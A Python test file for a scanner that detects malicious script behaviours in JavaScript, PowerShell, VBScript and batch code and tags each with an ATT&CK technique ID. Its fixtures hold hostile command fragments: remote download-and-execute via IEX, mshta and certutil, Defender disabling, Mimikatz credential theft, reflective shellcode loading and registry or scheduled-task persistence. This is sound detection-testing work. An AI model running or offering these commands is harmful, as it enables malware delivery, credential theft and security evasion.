"""Tests for the shared scripting behaviour-rule catalogue."""

from __future__ import annotations

from docutracex.parsers import script_rules as sr


def _rules(code, lang):
    return {h["rule"] for h in sr.scan(code, lang)}


def test_js_behaviours_and_attack_in_label() -> None:
    code = 'new ActiveXObject("WScript.Shell").Run("powershell -enc AAAA"); unescape("%u9090");'
    hits = sr.scan(code, sr.JS)
    rules = {h["rule"] for h in hits}
    assert {"js_activex", "js_wscript_shell", "js_lolbin", "js_unescape"} <= rules
    # ATT&CK id is carried and appended to the label.
    shell = next(h for h in hits if h["rule"] == "js_wscript_shell")
    assert shell["attack"] == "T1059.001" and "T1059.001" in shell["label"]


def test_powershell_download_and_evasion() -> None:
    code = ('$c=New-Object Net.WebClient; IEX($c.DownloadString("http://x"));'
            ' Set-MpPreference -DisableRealtimeMonitoring; powershell -w hidden -enc ' + "A" * 20)
    rules = _rules(code, sr.PS)
    assert {"ps_download", "ps_iex", "ps_defender_off", "ps_hidden", "ps_encoded"} <= rules


def test_powershell_injection_and_credentials() -> None:
    code = ("[Reflection.Assembly]::Load([Convert]::FromBase64String($b)); VirtualAlloc($x);"
            " Invoke-Mimikatz; Register-ScheduledTask -TaskName evil")
    rules = _rules(code, sr.PS)
    assert {"ps_reflection_load", "ps_shellcode", "ps_cred_access", "ps_persist"} <= rules


def test_vbscript_behaviours() -> None:
    code = ('Set s = CreateObject("WScript.Shell"): s.Run "mshta http://x"'
            ' : Execute(payload) : StrReverse("abc")')
    rules = _rules(code, sr.VBS)
    assert {"vbs_activex", "vbs_shell", "vbs_lolbin", "vbs_exec", "vbs_obfusc"} <= rules


def test_batch_behaviours() -> None:
    code = "powershell -enc AAAA\ncertutil -urlcache -f http://x/p.exe p.exe\nreg add HKCU\\...\\Run /v x"
    rules = _rules(code, sr.BAT)
    assert {"bat_powershell", "bat_download", "bat_persist"} <= rules


def test_language_scoping() -> None:
    # A PowerShell-only rule never fires on JS, and vice versa.
    assert "ps_amsi" not in _rules("amsiInitFailed", sr.JS)
    assert "ps_amsi" in _rules("amsiInitFailed", sr.PS)


def test_risk_escalation_on_attack_chain() -> None:
    code = 'IEX((New-Object Net.WebClient).DownloadString("http://x"))'
    chain = sr.risk_escalation(sr.scan(code, sr.PS))
    assert chain is not None and chain["rule"] == "script_attack_chain" and chain["severity"] == "high"
    # A single lonely behaviour is not a chain.
    assert sr.risk_escalation(sr.scan("whoami", sr.PS)) is None


def test_every_rule_compiles_and_has_attack() -> None:
    for rid, (langs, sev, attack, label, rx) in sr._COMPILED.items():
        assert langs and sev in ("high", "medium", "info")
        assert attack.startswith("T") and label
